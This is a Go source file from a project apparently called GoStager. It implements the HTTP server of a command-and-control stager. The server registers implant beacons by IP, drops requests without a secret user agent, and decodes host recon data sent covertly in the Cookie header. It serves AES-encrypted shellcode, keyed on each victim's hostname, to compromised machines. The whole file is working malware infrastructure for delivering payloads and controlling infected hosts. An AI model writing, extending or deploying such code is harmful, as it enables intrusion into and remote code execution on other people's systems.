package http

import (
	"GoStager/cmd/config"
	"GoStager/cmd/cryptoUtil"
	"GoStager/cmd/util"
	b64 "encoding/base64"
	"errors"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
	"strings"
)

type kitten struct {
	target     string
	shellcode  []byte
	id         int
	initChecks util.InitialChecks
}

var (
	userA string
	M     map[string]*kitten
)

func (K *kitten) GetTarget() string {
	return K.target
}

func (K *kitten) GetShellcode() []byte {
	return K.shellcode
}

func (K *kitten) GetId() int {
	return K.id
}

func (K *kitten) GetInitChecks() util.InitialChecks {
	return K.initChecks
}

func CreateHttpServer(conf config.General) {
	M = map[string]*kitten{"all targets": {
		target:    "all targets",
		shellcode: []byte(fmt.Sprintf("%d", conf.GetSleep())),
		id:        len(M),
	}}
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.GetEndpoint(), logRequest)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// HostShellcode Hosts the Shellcode
func HostShellcode(path string, ip string) error {
	var err error
	if M[ip].initChecks.GetHostname() == "" {
		return errors.New("wait for the implant to call back")
	}
	key := cryptoUtil.GenerateKey(M[ip].initChecks.GetHostname(), 32)
	shellcode, err := util.ScToAES(path, key)
	if err != nil {
		return err
	}
	fmt.Println(color.Green("[+] Key generated is : " + key))
	M[ip].shellcode = shellcode
	fmt.Println(color.Green("[+] Shellcode hosted for " + ip))
	return error(nil)
}

func HostSleep(t int, ip string) {
	M[ip].shellcode = []byte(fmt.Sprintf("%d", t))
	fmt.Printf("%s %d%s %s%s\n", color.Green("[+] Sleep time set to"), color.Yellow(t), color.Yellow("s"), color.Green("on "), color.Yellow(ip))
}

// Logs the requests from the beacons
func logRequest(w http.ResponseWriter, r *http.Request) {
	userAgent := r.UserAgent()
	//check user agent
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	addr := strings.Split(r.RemoteAddr, ":")
	//Check if the beacon is already in the map
	if _, ok := M[addr[0]]; ok {
		_, err := w.Write(M[addr[0]].GetShellcode())
		if err != nil {
			return
		}
		return
	} else {
		M[addr[0]] = &kitten{
			target:    addr[0],
			id:        len(M),
			shellcode: M["all targets"].GetShellcode(), //Set the shellcode to the default sleep time
		}
		_, err := w.Write(M[addr[0]].GetShellcode())
		if err != nil {
			return
		}
		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(addr[0]))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))
		//Get recon data
		cookie := r.Header.Get("Cookie")
		if cookie != "" {
			out, err := b64.StdEncoding.DecodeString(cookie)
			M[addr[0]].initChecks = util.UnmarshalJSON(out)
			if err != nil {
				fmt.Println(color.Red("Error decoding cookie"))
			}
			util.PrintCookie(out)
		}
	}
}
